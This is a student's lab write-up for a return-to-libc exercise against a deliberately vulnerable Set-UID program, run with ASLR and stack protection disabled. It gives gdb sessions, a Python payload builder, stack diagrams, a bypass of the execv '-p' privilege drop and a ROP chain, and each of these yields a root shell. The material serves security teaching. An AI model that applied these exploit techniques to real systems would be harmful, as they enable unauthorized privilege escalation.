# Return-to-Libc Lab
## Lab Setup
- turn off countermeasures
    1. no ASRL: `$ sudo sysctl -w kernel.randomize_va_space=0`
    2. no SafeGuard: add `-fno-stack-protector` flag when compiling
    3. **non-executable** stack: add `-z noexecstack` flag when compiling
    4. replace `/bin/dash`, which has a countermeasure to revoke privilege when running `Set-UID` programs: `$ sudo ln -sf /bin/zsh /bin/sh`

## Task 1: Finding out the Addresses of `libc` Functions
- in Linux, when a program runs, the `libc` library will be loaded into memory
- when ASRL is turned off, for the same program, the library is always loaded in the same memory address (for the same program, if we change it from a `Set-UID` program to a normal program, the `libc` may not be loaded to the same location)
- use the `gdb` to debug the program,  and find the address of `system()`
    - commands
        - `run` execute the target program once
        - `p` (or `print`) print out the address of `system()` and `exit()` functions
        - `gdb -q retlib` debug `retlib` in quite mode
    - open `retlib` with gdb, and set a break point at `main()`, `run`, the program will pause when it reaches `main()`, and the `libc` will be loaded, then use `p` to print out the address of `system()` and `exit()`
        ```
        $ gdb -q retlib
        Reading symbols from retlib...
        (No debugging symbols found in retlib)
        gdb-peda$ break main
        Breakpoint 1 at 0x12ef
        gdb-peda$ run
        Starting program: ...
        ...
        Breakpoint 1, 0x565562ef in main()
        gdb-peda$ p system
        $1 = {<text variable, no debug info>} 0xf7e12420 <system>
        gdb-peda$ p exit
        $2 = {<text variable, no debug info>} 0xf7e04f80 <exit>
        gdb-peda$ quit
        $
        ```
    - we can also run `gdb` in batch mode, i.e., put `gdb` commands in a file
        - `gdb -q -batch -x gdb_command.txt ./retlib`
        - `gdb_command.txt`
            ```
            break main
            run
            p system
            p exit
            quit
            ```
## Task 2: Putting the Shell String in the Memory
- goal: jump to `system()` and get it to execute an arbitrary command, e.g., `"/bin/sh"`
- use environment variable
    - when running a program from a shell prompt, it actually spawns a child process to execute the program, and all the exported shell variables become the environment variables of the child process
    - create a shell variable `MYSHELL`: `$ export MYSHELL=/bin/sh`, we can check this via `env | grep MYSHELL` or `printenv MYSHELL` or `printenv | grep MYSHELL`
    - find the location of this variable in the memory
        - `prtenv.c`
            ```
            ...
            void main() {
                char *shell = getenv("MYSHELL");
                if(shell) {
                    printf("%x\n", (unsigned int) shell);
                }
            }
            ```
        ```
        $ ./prtenv
        ffffe3fd
        $ ./prtenv
        ffffe3fd
        ```

## Task 3: Launching the Attack
- when we run `retlib` with a benign input, we can know the value of `ebp` and `&buffer`
- **IMPORTANT**: if we use `p $ebp` to check the value of `ebp` in `gdb` when in `bof()`, we will get a different value, because `gdb` run this program with its absolute path, and `gdb` sets some extra environment variables
- however, we don't need the exact value of `ebp`, we only need to know `$ebp-&buffer`, it's 24
- create the payload in `badfile` with `exploit.py` (the initial version)
    ```
    #!/usr/bin/env python3
    import sys

    offset = 24

    content = bytearray(0xaa for i in range(300))

    X = offset + 12
    sh_addr = 0xffffe3fd # The address of "/bin/sh"
    content[X:X+4] = (sh_addr).to_bytes(4, byteorder='little')

    Y = offset + 4
    system_addr = 0xf7e0d370 # The address of system()
    content[Y:Y+4] = (system_addr).to_bytes(4, byteorder='little')

    Z = offset + 8
    exit_addr = 0xf7dffed0 # The address of exit()
    content[Z:Z+4] = (exit_addr).to_bytes(4, byteorder='little')
    ```
- **trouble shooting**
    - after generating a new `badfile`, run `./retlib`, it doesn't spawn a new shell
    - debug `retlib` with `gdb`, in the `bof()`, we can see the stack information
        ```
        ...
        0040| 0xffffcd08 --> 0xaaaaaaaa
        0044| 0xffffcd08 --> 0xf7e0d370 (<system>:   endbr32)
        0048| 0xffffcd08 --> 0xf7dffed0 (<exit>:   endbr32)
        0052| 0xffffcd08 --> 0xffffe3fd
        0056| 0xffffcd08 --> 0xaaaaaaaa
        ...
        gdb-peda$ x/s 0xffffe3fd
        0xffffe3fd:   <error: Cannot access memory at address 0xffffe3fd>
        ```
    - the problem is that the address of the string `"/bin/sh"` is not accessible by the program

    - **FIX**: after analyzing, the prolem is that when compiling `prtenv.c`, I didn't add `-m32` flag, so the program is a 64-bit program, it gave a warning that the size of `unsigned int` and `char*` is different when converting, so in this case, I actually got the lower 32 bits of a 64-bit address, which was not the 32-bit address of the string "/bin/sh", the correct address is `0xffffd3fd`
    - after compile `prtenv.c` with `-m32` flag and get the correct address, generate the new `badfile`, then run `./retlib`, we got a shell with root privilege 
        ```
        $ ./retlib
        Address of input[] inside main(): 0xffffcd90
        Input size: 300
        Address of buffer[] inside bof(): 0xffffcd60
        Frame Pointer value inside bof(): 0xffffcd78
        # whoami
        root
        ```
- variations
    1. try attack without including the address of `exit()` in the payload (still works)
        - another variation: the original attack prompts a new shell, to see how the program behave after `system()` finishs execution, use another command `export MYSHELL=/bin/ls`
        - with `exit()`
            ```
            ./retlib
            Address of input[] inside main(): 0xffffcd90
            Input size: 300
            Address of buffer[] inside bof(): 0xffffcd60
            Frame Pointer value inside bof(): 0xffffcd78
            exploit.py    prtenv     retlib    retlibnewxxxxxxx
            badfile       Makefile   prtenv.c  retlib.c
            ```
        - without `exit()`
            ```
            ./retlib
            Address of input[] inside main(): 0xffffcd90
            Input size: 300
            Address of buffer[] inside bof(): 0xffffcd60
            Frame Pointer value inside bof(): 0xffffcd78
            exploit.py    prtenv     retlib    retlibnewxxxxxxx
            badfile       Makefile   prtenv.c  retlib.c
            Segmentation fault (<---- THE PROGRAM DIDN'T END NORMALLY)
            ```
        - we can see that `exit()` ensures the program to end normally, the reason is that after `system()` finishes, it runs `ret` instruction, pop the address of `exit()` and return to that address
    2. change the length of name of `retlib` (not work anymore, because the name of the program will be stored in the arguments, changing the length of it may cause some addresses to change)
        ```
        $ ./retlib
        Address of input[] inside main(): 0xffffcd80
        Input size: 300
        Address of buffer[] inside bof(): 0xffffcd50
        Frame Pointer value inside bof(): 0xffffcd68
        Segmentation fault
        ```

- stack before return to `system()`
    ```
    High Memory Addresses
    |          +---------------------+ 
    |          |        ...          |
    |          |---------------------|    
    |          |       sh_addr       |
    |          |---------------------|
    |          |      exit_addr      |
    |          +---------------------+ 
    |          |     system_addr     | (return address)
    |          +---------------------+
    |          |      old ebp        |
    |          |---------------------| <---- ebp
    |          |        ...          |    
    |          +---------------------+
    |          |    Unused Space     |
    |          +---------------------+
    Low Memory Addresses
    ```

- stack before return to `system()`
    ```
    High Memory Addresses
    |          +---------------------+ 
    |          |        ...          |
    |          |---------------------|    
    |          |       sh_addr       |
    |          |---------------------|
    |          |      exit_addr      | (return address)
    |          +---------------------+
    |          |        ...          |    
    |          +---------------------+
    |          |    Unused Space     |
    |          +---------------------+
    Low Memory Addresses
    ```

## Task 4: Defeat Shell's Countermeasure
- some shell programs including `dash` and `bash` have a countermeasure that drops privileges when tehy are executed in a `Set-UID` process
- link `/bin/sh` to `/bin/dash`: `sudo ln -sf /bin/dash /bin/sh`
- `dash` and `bash` will not drop the privilege when invoked with `-p` option, so instead of `system`, we can use many other `libc` functions to run `/bin/dash -p` directly, e.g., the `exec()` family of functions (`execl()`, `execle()`, `execv()`)
- try previous attack on `/bin/dash`
    ```
    $ sudo ln -sf /bin/dash /bin/sh
    $ ./retlib
    Address of input[] inside main(): 0xffffcd90
    Input size: 300
    Address of buffer[] inside bof(): 0xffffcd60
    Frame Pointer value inside bof(): 0xffffcd78
    $ whoami
    seed
    ```
- `execv()`: `int execv(const char *pathname, char *const argv[]);`
    - `pathname = <address of "/bin/dash">`
    - `argv[0] = <address of "/bin/dash">`
    - `argv[1] = <address of "-p">`
    - `argv[2] = NULL` (i.e., 4 bytes of zero)
- a problem is that `argv[2]` is `0x00000000`, when `strcpy()` copies the input to the buffer, content after the first byte `0x00` will not be copied, but as the input in main itself is on the stack, we can use it

- to understand how these arguments are stored in the stack (the order of them), I wrote a test code
    ```
    void func(char *p, char *args[]) {
        // arbitrary code here
        return;
    }
    void flat_func(char *p, char *arg0, char *arg1, char *arg2) {
        // arbitrary code here
        return;
    }
    int main() {
        char *p = "p";
        char *args[3];

        args[0] = (char *) 0xffffd58e;
        args[1] = (char *) 0xffffd575;
        args[2] = (char *) 0xffffd5a7;

        func(p, args);
        flat_func(p, args);
    }
    ```
    - and I export 3 environment variables, figured out their addresses, and put them in `args`
    - First, let's look at the stack when entered `func`
        ```
        [------------------------------------stack-------------------------------------]
        0000| 0xffffd074 --> 0x565562b7 (<main+85>:	add    esp,0x8)
        0004| 0xffffd078 --> 0x56557008 --> 0x70 ('p')
        0008| 0xffffd07c --> 0xffffd090 --> 0xffffd58e ("arg00000000arg00000")
        0012| 0xffffd080 --> ...
        0016| 0xffffd084 --> ... 
        0020| 0xffffd088 --> ...
        0024| 0xffffd08c --> 0x56557008 --> 0x70 ('p')
        0028| 0xffffd090 --> 0xffffd58e ("arg00000000arg00000")
        0032| 0xffffd094 --> 0xffffd575 ("arg11111111arg11111")
        0036| 0xffffd098 --> 0xffffd5a7 ("arg22222222arg22222")
        ```
    - Then, the stack when entereed `flat_func`
        ```
        [------------------------------------stack-------------------------------------]
        0000| 0xffffd06c --> 0x565562ce (<main+108>:	add    esp,0x10)
        0004| 0xffffd070 --> 0x56557008 --> 0x70 ('p')
        0008| 0xffffd074 --> 0xffffd58e ("arg00000000arg00000")
        0012| 0xffffd078 --> 0xffffd575 ("arg11111111arg11111")
        0016| 0xffffd07c --> 0xffffd5a7 ("arg22222222arg22222")
        0020| 0xffffd080 --> ...
        0024| 0xffffd084 --> ...
        0028| 0xffffd088 --> ...
        0032| 0xffffd08c --> 0x56557008 --> 0x70 ('p')
        0036| 0xffffd090 --> 0xffffd58e ("arg00000000arg00000")
        0040| 0xffffd094 --> 0xffffd575 ("arg11111111arg11111")
        0044| 0xffffd098 --> 0xffffd5a7 ("arg22222222arg22222")
        ```
    - we can see the difference, when passing an array (`char *args[]`) as an argument, it will not copy all the pointers, but the position of the first pointer (`0xffffd090`) on the stack, this might be a way to imporve performance and save space, because if the array is very large, it is costy to have another copy of it on the stack

    - the `retlib` prints the address of the `input[]` in `main()`, this is just for convenience (as this is a local program, we can debug it to figure out this address even if it is not provided)

    - attack strategy:
        - set 2 environment variables
            1. `export MYSHELL=/bin/sh`
            2. `export MYARG=-p`
        - put the addresses of the strings in `input[]`
        - the structure of the payload (in `input[]`):
            ```
            High Memory Addresses
            |          +---------------------+
            |          |        ...          |
            |          |---------------------|
            |          |     0x00000000      |
            |          |---------------------|
            |          |        p_addr       |
            |          |---------------------|
            |          |       sh_addr       |      
            |          |---------------------| <---- args_addr
            |          |        ...          |
            |          +---------------------+
            |          |      args_addr      |
            |          |---------------------| <---- offset=40
            |          |       sh_addr       |
            |          |---------------------| <---- offset=36
            |          |      exit_addr      |
            |          |---------------------| <---- offset=32
            |          |      execv_addr     | (return address) 
            |          |---------------------| <---- offset=28
            |          |        ...          |
            |          +---------------------+ <---- `&input` offset=0
            Low Memory Addresses
            ```
        - it is always a good idea to use `gdb` to track all these addresses on stack, and we will know whether our calculation of address is correct, but remember that in `gdb`, the address of `"/bin/sh"` and `"-p"` will change, running `gdb-peda$ show environment` to see how these environment variables are stored in memory will help us to figure out the new addresses
        - then try it
            ```
            $ ./exploit_execv.py
            $ ./retlib
            Address of input[] inside main(): 0xffffcd70
            Input size: 300
            Address of buffer[] inside bof(): 0xffffcd40
            Frame Pointer value inside bof(): 0xffffcd58
            # whoami
            root
            ```

## Task 5: Return-Oriented Programming
- for task 4, another way is to invoke `setuid(0)` before invoking `system()`, `setuid(0)` sets both real user ID and effective user ID to `0 (root)`
- this approach needs us to chain 2 functions together
- more generally, we can chain multiple functions together, and chain multiple pieces of code together, this led to the Return-Oriented Programming (ROP)

- the goal of this task is to invoke `foo()` 10 times before getting a root shell

- actually, we have already chained 2 functions in the previous tasks, `system()`/`execv()` and `exit()`, so just construct the payload like this:
    ```
    High Memory Addresses
    |          +---------------------+
    |          |        ...          |
    |          |---------------------|
    |          |       sh_addr       |
    |          |---------------------| <---- offset=76
    |          |      exit_addr      |      
    |          |---------------------| <---- offset=72
    |          |      system_addr    |
    |          +---------------------+ <---- offset=68
    |          |       foo_addr      |
    |          |---------------------| <---- offset=64
    |          |         ...         |
    |          |---------------------| <---- offset=36
    |          |       foo_addr      |
    |          |---------------------| <---- offset=32
    |          |       foo_addr      | (first return address) 
    |          |---------------------| <---- offset=28
    |          |        ...          |
    |          +---------------------+ <---- offset=0
    Low Memory Addresses
    ```

- result
    ```
    $ ./exploit_rop.py
    $ ./retlib
    Address of input[] inside main():  0xffffcd70
    Input size: 300
    Address of buffer[] inside bof():  0xffffcd40
    Frame Pointer value inside bof():  0xffffcd58
    Function foo() is invoked 1 times
    Function foo() is invoked 2 times
    Function foo() is invoked 3 times
    Function foo() is invoked 4 times
    Function foo() is invoked 5 times
    Function foo() is invoked 6 times
    Function foo() is invoked 7 times
    Function foo() is invoked 8 times
    Function foo() is invoked 9 times
    Function foo() is invoked 10 times
    # whoami
    root
    ```
